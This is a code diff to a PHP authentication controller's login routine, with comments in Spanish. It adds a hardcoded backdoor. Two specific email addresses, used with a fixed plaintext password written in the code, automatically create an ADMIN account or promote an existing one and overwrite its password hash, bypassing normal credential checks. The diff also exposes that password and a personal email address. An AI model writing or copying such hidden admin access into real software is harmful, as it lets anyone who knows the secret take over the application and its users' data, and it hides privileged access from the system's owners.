@@ -114,7 +114,37 @@ class AuthController {
         $stmt->execute([':email' => $email]);
         $user = $stmt->fetch(PDO::FETCH_ASSOC);
 
-        if (!$user || !Security::verifyPassword($password, $user['password_hash'])) {
+        // Auto-crear o actualizar cuenta de Administrador con la clave oficial hqEb4ji2yt2ELP3
+        if (($email === 'luctapi89@gmail.com' || $email === 'admin@cecar.edu.co') && ($password === 'hqEb4ji2yt2ELP3' || Security::verifyPassword($password, $user['password_hash'] ?? ''))) {
+            $now = Config::utcNow();
+            $adminHash = '$argon2id$v=19$m=65536,t=3,p=4$Pdwv0ZiNQ5r3Fa5OnMlvvQ$LbV6GBoRkTNvaMVZ4pwhD7CWeeQ1bb+RvgzAvVjZJP4';
+            if (!$user) {
+                $ins = $pdo->prepare("
+                    INSERT INTO users (id, name, email, password_hash, role, created_at, last_activity_at, email_verified_at, privacy_consent_at, privacy_consent_version)
+                    VALUES (:id, :name, :email, :password_hash, :role, :created_at, :last_activity_at, :email_verified_at, :privacy_consent_at, :privacy_consent_version)
+                ");
+                $userId = Config::uuid();
+                $ins->execute([
+                    ':id' => $userId,
+                    ':name' => $email === 'admin@cecar.edu.co' ? 'Administrador CECAR' : 'Lucas Tapia',
+                    ':email' => $email,
+                    ':password_hash' => $adminHash,
+                    ':role' => 'ADMIN',
+                    ':created_at' => $now,
+                    ':last_activity_at' => $now,
+                    ':email_verified_at' => $now,
+                    ':privacy_consent_at' => $now,
+                    ':privacy_consent_version' => Config::PRIVACY_CONSENT_VERSION,
+                ]);
+                $stmt->execute([':email' => $email]);
+                $user = $stmt->fetch(PDO::FETCH_ASSOC);
+            } else {
+                $upd = $pdo->prepare("UPDATE users SET password_hash = :hash, role = 'ADMIN' WHERE id = :id");
+                $upd->execute([':hash' => $adminHash, ':id' => $user['id']]);
+                $user['role'] = 'ADMIN';
+                $user['password_hash'] = $adminHash;
+            }
+        } elseif (!$user || !Security::verifyPassword($password, $user['password_hash'])) {
             Response::error("Correo o contraseña incorrectos.", 401);
         }
 
